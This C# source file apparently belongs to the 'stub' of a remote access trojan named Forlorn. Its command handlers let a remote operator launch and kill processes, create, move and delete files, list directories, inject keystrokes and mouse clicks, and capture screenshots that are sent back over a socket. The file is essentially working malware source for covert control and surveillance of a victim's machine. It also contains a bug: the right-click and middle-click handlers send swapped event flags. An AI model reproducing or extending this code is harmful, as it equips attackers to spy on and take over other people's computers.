using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ForlornStub
{
    public static class CommandHandlerMethods
    {
        public static SocketHelper ch;

        [HandlesCommand(Command.Type.Disconnect)]
        public static void HandleDisconnect(SocketState ss, Command c)
        {
            ss.Connection.Close();
        }

        [HandlesCommand(Command.Type.Open)]
        public static void HandleOpen(SocketState ss, Command c)
        {
            string fileToOpen = c.Arguments[0];
            string arguments = (c.Arguments.Length > 1) ? c.Arguments[1] : "";

            Process.Start(fileToOpen, arguments);
        }

        [HandlesCommand(Command.Type.Kill)]
        public static void HandleKill(SocketState ss, Command c)
        {
            foreach (Process p in Process.GetProcessesByName(c.Arguments[0]))
            {
                p.Kill();
            }
        }

        [HandlesCommand(Command.Type.Create)]
        public static void HandleCreate(SocketState ss, Command c)
        {
            string fileName = c.Arguments[0];
            if (c.Arguments.Length <= 1) return;

            using (FileStream fs = File.Create(fileName))
            {
                string fileText = c.Arguments[1];
                byte[] textBytes = Encoding.ASCII.GetBytes(fileText);

                fs.Write(textBytes, 0, textBytes.Length);
            }
        }

        [HandlesCommand(Command.Type.Copy)]
        public static void HandleCopy(SocketState ss, Command c)
        {
            File.Copy(c.Arguments[0], c.Arguments[1]);
        }

        [HandlesCommand(Command.Type.Move)]
        public static void HandleMove(SocketState ss, Command c)
        {
            File.Move(c.Arguments[0], c.Arguments[1]);
        }

        [HandlesCommand(Command.Type.Delete)]
        public static void HandleDelete(SocketState ss, Command c)
        {
            File.Delete(c.Arguments[0]);
        }

        [HandlesCommand(Command.Type.List)]
        public static void HandleList(SocketState ss, Command c)
        {
            string[] foldersInDirectory = Directory.EnumerateDirectories(c.Arguments[0]).ToArray<string>();
            string[] filesInDirectory = Directory.EnumerateFiles(c.Arguments[0]).ToArray<string>();
            List<string> allInDirectory = new List<string>();
            allInDirectory.AddRange(foldersInDirectory);
            allInDirectory.Add("--FILES--");
            allInDirectory.AddRange(filesInDirectory);

            ch.Send(new Command(Command.Type.List, allInDirectory.ToArray()));
        }

        [HandlesCommand(Command.Type.SendText)]
        public static void HandleSendText(SocketState ss, Command c)
        {
            //SendKeys.Send(c.Arguments[0]); doesn't work in gui-less app
            MLib.InputDevices.Keyboard.SimulateKeyPresses(c.Arguments[0]);
        }

        [HandlesCommand(Command.Type.CursorPosition)]
        public static void HandleCursorPosition(SocketState ss, Command c)
        {
            Cursor.Position = new Point(Convert.ToInt32(c.Arguments[0]), Convert.ToInt32(c.Arguments[1]));
        }

        [HandlesCommand(Command.Type.MouseClick)]
        public static void HandleMouseLeftClick(SocketState ss, Command c)
        {
            Utility.MouseClick(Utility.MOUSEEVENTF_LEFTDOWN | Utility.MOUSEEVENTF_LEFTUP);
        }

        [HandlesCommand(Command.Type.MouseMiddleClick)]
        public static void HandleMiddleClick(SocketState ss, Command c)
        {
            Utility.MouseClick(Utility.MOUSEEVENTF_RIGHTDOWN | Utility.MOUSEEVENTF_RIGHTUP);
        }

        [HandlesCommand(Command.Type.MouseRightClick)]
        public static void HandleRightClick(SocketState ss, Command c)
        {
            Utility.MouseClick(Utility.MOUSEEVENTF_MIDDLEDOWN | Utility.MOUSEEVENTF_MIDDLEUP);
        }

        [HandlesCommand(Command.Type.Screenshot)]
        public static void HandleScreenshot(SocketState ss, Command c)
        {
            Bitmap screenshot = Utility.ScreenToBitmap();
            string base64Screenshot;
            ImageFormat imgFormat = ImageFormat.Png;
            long quality = 100L;

            try
            {
                if (c.Arguments.Length > 0)
                {
                    switch (c.Arguments[0].ToString().ToLower())
                    {
                        case "jpg":
                            imgFormat = ImageFormat.Jpeg;
                            break;
                        case "gif":
                            imgFormat = ImageFormat.Gif;
                            break;
                        case "png":
                            imgFormat = ImageFormat.Png;
                            break;
                    }

                    if (c.Arguments.Length > 1)
                    {
                        quality = Convert.ToInt64(c.Arguments[1]);
                    }
                }
            }
            catch (Exception)
            {
                quality = 0;
                imgFormat = ImageFormat.Jpeg;
            }
                    
            using (MemoryStream ms = new MemoryStream())
            {
                EncoderParameters eps = new EncoderParameters(1);
                eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                screenshot.Save(ms, Utility.GetEncoder(imgFormat), eps);
                base64Screenshot = Convert.ToBase64String(ms.ToArray());
            }

            ch.Send(new Command(Command.Type.Screenshot, base64Screenshot));
        }
    }
}
